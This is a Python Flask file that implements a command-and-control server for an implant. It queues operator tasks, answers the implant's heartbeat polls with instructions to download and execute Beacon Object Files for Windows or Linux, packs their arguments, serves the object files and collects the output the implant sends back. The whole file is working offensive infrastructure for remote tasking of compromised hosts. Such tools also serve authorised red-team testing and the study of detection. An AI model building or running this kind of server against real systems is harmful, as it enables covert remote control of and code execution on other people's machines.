from flask import Flask
from flask import request
from flask import send_from_directory
import base64
import json
import binascii
from struct import pack, calcsize
from collections import deque
import secrets

app = Flask(__name__)

bofsRootDir = "/bofs/"

"""
Structure of tasks:
cmdData0 = {
	"header" : "thread:zb",
	"argv" : "8.8.8.8:53",
	"buffer" : "file:udpPayloads.txt",
	"name" : "bof:udpScanner",
};

cmdData1 = {
	"header" : "inline:z",
	"argv" : "-r",
	"name" : "bof:uname",
};
"""

# Fifo queue of tasks to execute by implant
# POST request to /tasking endpoint adds (appendLeft) a new task to it
# GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
TaskFifo = deque()

# Repositories of tasks' input data (sent from operator) and tasks' output data (sent back from implant)
# stored under reqID keys 
InputDict = dict()
OutputDict = dict()

# borrowed from https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py
class BeaconPack:
    def __init__(self):
        self.buffer = b''
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addshort(self, short):
        self.buffer += pack("<h", short)
        self.size += 2

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s)+2, s)
        self.size += calcsize(fmt)


@app.route("/")
def main_page():
    return "<p>bofs repository</p>"

@app.route("/tasking", methods=['GET', 'POST'])
def addTask():

    if request.method == 'POST' and request.is_json:
        reqData = request.get_json()
        # add unique ID to the task
        reqData['id'] = secrets.token_hex()
        # convert JSON request to string and append it to task FIFO
        data = json.dumps(reqData)
        TaskFifo.appendleft(data) 
        return "<p>Consumed</p>"


    # handle GET:
    resp = []
    resp.append("<p>Pending tasks queue:</p>")

    for task in TaskFifo:
        resp.append(task + '<br/>')

    resp.append("<p>Tasks history:</p>")

    for key, value in InputDict.items():
        if key in OutputDict:
            resp.append(value + '<br/>')
            resp.append(OutputDict[key].decode('utf-8') + '<br/><br/>')
    
    str_out = ''.join(resp)
    return str_out

# GET /endpoint - check if task is available
# POST /endpoint - send in task's output data
@app.route("/endpoint", methods=['GET', 'POST'])
def heartbeat():

    # get implant's output data and add it to the output's store under 'reqID' key
    if request.method == 'POST':
        reqID = request.headers.get('Authorization')
        data = base64.b64decode(request.get_data())
        OutputDict[reqID] = data
        return ""

    # abort, if there are no tasks to process
    if len(TaskFifo) == 0:
        return "nothing to do"

    # get implant's identification data encoded in 'Authorization' header
    authz = base64.b64decode(request.headers.get('Authorization')).decode('utf-8')
    if not authz:
        return "go away"

    arch, os = authz.split(':')
    if arch == "x86_64":
        arch = "x64"
    if os == "windows":
        os = "coff"
    else:
        os = "elf"

    # get tasking data from TaskFifo and prepare for processing it
    data = TaskFifo.pop()
    cmdData = json.loads(data) # deserialize to JSON
    reqID = cmdData['id']

    # store task's input data for logging purposes
    InputDict[reqID] = data

    # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
    Instruction = {
        "id": reqID,
        "name": cmdData['name'],
    }

    # we're dealing with BOF execution task, so let's:
    # 1. prepare path/URI for the BOF in case when downloading it will be needed
    # 2. calculate requested BOF's hash
    # 3. add bof_hash to the header field
    # 4. if 'persist' is in the header, put it at the end
    if 'bof:' in cmdData['name']:
        # prepare instruction's: 'path' field for bofs
        _, name = cmdData['name'].split(':')
        bofHttpPath = bofsRootDir + name + "." + os + "." + arch + ".o"
        Instruction['path'] = bofHttpPath
        bofLocalPath = bofHttpPath.lstrip('/')

        # calculate BOF's hash
        with open(bofLocalPath, 'rb') as f:
            bof_hash = format(abs(hash(f.read())), 'x')

        header = cmdData['header']
        if 'persist' in header:
            # replace 'persist' for bof_hash in header and then append 'persist'
            header = header.replace("persist", bof_hash)
            Instruction['header'] = header + ":persist"
        else:
            # append hash to the header:
            Instruction['header'] = header + ":" + bof_hash

    args_spec = header.split(':')[1]

    # check if args_spec from header contains a buffer ("b"):
    for c in args_spec:
        # buffer in 'header'
        if c == 'b':
            if 'file:' in cmdData['buffer']:
                _, path = cmdData['buffer'].split(':')
                with open(path, 'rb') as f:
                     Instruction['buffer'] = base64.b64encode(f.read()).decode('utf-8')
            else:
                Instruction['buffer'] = base64.b64encode(cmdData['buffer'])
            # we're done, remove 'b' character
            args_spec = args_spec.replace('b', '')


    if 'argv' in cmdData:
        ArgsPack = BeaconPack()

        # build 'args' by parsing 'argv' and inspecting args_spec:
        # possible values in 'header': iszZ
        arg_list = cmdData['argv'].split(' ')
        i = 0
        while i < len(arg_list):
            if args_spec[i] == 'z':
                ArgsPack.addstr(arg_list[i])
            elif args_spec[i] == 'Z':
                ArgsPack.addWstr(arg_list[i])
            elif args_spec[i] == 's':
                ArgsPack.addshort(arg_list[i])
            elif args_spec[i] == 'i':
                ArgsPack.addint(arg_list[i])
            i += 1
        Instruction['args'] = base64.b64encode(ArgsPack.getbuffer()).decode('utf-8')
        #TODO: in implant allocate buffer if present and add to bof_args

    # return Implant's Instruction for execution
    return Instruction 

@app.route(bofsRootDir + '<path:path>')
def send_report(path):
    return send_from_directory('bofs', path, mimetype='application/octet-stream')

if __name__ == '__main__':
    app.run(host='127.0.0.1',port=8000,debug=True)
